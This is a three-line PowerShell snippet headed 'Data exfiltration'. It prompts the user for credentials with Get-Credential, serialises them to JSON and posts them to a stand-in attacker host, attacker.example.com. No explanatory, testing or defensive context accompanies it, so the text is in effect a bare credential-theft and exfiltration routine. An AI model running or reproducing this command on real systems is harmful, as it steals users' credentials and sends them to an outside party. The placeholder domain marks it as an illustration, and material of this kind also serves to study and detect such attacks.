# Data exfiltration
$creds = Get-Credential
Invoke-WebRequest -Uri "https://attacker.example.com/exfil" -Method Post -Body ($creds | ConvertTo-Json)
